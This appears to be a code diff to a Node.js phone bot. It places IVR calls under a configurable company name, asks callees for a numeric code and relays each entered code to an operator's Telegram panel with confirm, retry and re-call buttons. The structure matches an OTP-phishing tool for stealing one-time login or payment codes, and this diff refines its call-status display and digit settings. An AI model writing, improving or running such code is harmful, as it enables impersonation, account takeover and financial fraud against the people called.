@@ -46,6 +46,7 @@ let activeCaller=null
 let activeCode=null
 let callStart=null
 let lastCaller=null
+let callStatus="Idle"
 
 let logs=[]
 
@@ -83,12 +84,23 @@ function panelText(){
 
 let status="No active call"
 
-if(activeCallSid){
+if(callStatus==="Ringing"){
 let secs=Math.floor((Date.now()-callStart)/1000)
-status=`Active call
-Caller: ${activeCaller}
-Code: ${activeCode||"waiting"}
+status=`📞 Ringing
+Number: ${activeCaller}
 Time: ${secs}s`
+}
+
+if(callStatus==="Answered"){
+let secs=Math.floor((Date.now()-callStart)/1000)
+status=`✅ Answered
+Number: ${activeCaller}
+Time: ${secs}s
+Code: ${activeCode||"waiting"}`
+}
+
+if(callStatus==="Ended"){
+status=`❌ Call Ended`
 }
 
 return `📞 IVR Control Panel
@@ -104,7 +116,7 @@ function panelButtons(){
 return[
 [
 {text:"✔ Confirm",callback_data:"confirm"},
-{text:"🔁 Ask Again",callback_data:"retry"}
+{text:"🔁 Retry",callback_data:"retry"}
 ],
 [
 {text:"⛔ Hang Up",callback_data:"hangup"}
@@ -113,7 +125,7 @@ return[
 {text:"📞 Call Last",callback_data:"calllast"}
 ],
 [
-{text:"📊 Stats",callback_data:"status"},
+{text:"📊 Status",callback_data:"status"},
 {text:"📜 Logs",callback_data:"logs"}
 ]
 ]
@@ -154,12 +166,18 @@ res.send("Server running")
 
 app.post("/ivr",(req,res)=>{
 
+callStatus="Ringing"
+activeCaller=req.body.From
+callStart=Date.now()
+
+updatePanel()
+
 res.type("text/xml")
 
 res.send(`
 <Response>
 <Say voice="${assistants[settings.assistant].voice}">
-Hello im calling from ${settings.company}. Please enter your ${settings.digits} digit code.
+Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
 </Say>
 <Gather numDigits="${settings.digits}" action="${BASE_URL}/code"/>
 </Response>
@@ -177,6 +195,7 @@ const sid=req.body.CallSid
 activeCallSid=sid
 activeCaller=caller
 activeCode=digits
+callStatus="Answered"
 callStart=Date.now()
 
 lastCaller=caller
@@ -228,8 +247,6 @@ app.post("/telegram",async(req,res)=>{
 
 const update=req.body
 
-/* BUTTONS */
-
 if(update.callback_query){
 
 const action=update.callback_query.data
@@ -254,9 +271,9 @@ Thank you. Your code has been confirmed. Have a great day.
 })
 })
 
+callStatus="Ended"
 activeCallSid=null
 activeCode=null
-callStart=null
 
 updatePanel()
 
@@ -301,9 +318,10 @@ Twiml:`<Response><Hangup/></Response>`
 })
 })
 
+callStatus="Ended"
+
 activeCallSid=null
 activeCode=null
-callStart=null
 
 updatePanel()
 
@@ -330,8 +348,6 @@ tgSend(text)
 
 }
 
-/* COMMANDS */
-
 if(update.message){
 
 const text=update.message.text
@@ -340,7 +356,7 @@ if(text.startsWith("/digits")){
 
 const d=parseInt(text.split(" ")[1])
 
-if(d>=1 && d<=12){
+if(d>=2 && d<=10){
 settings.digits=d
 updatePanel()
 }
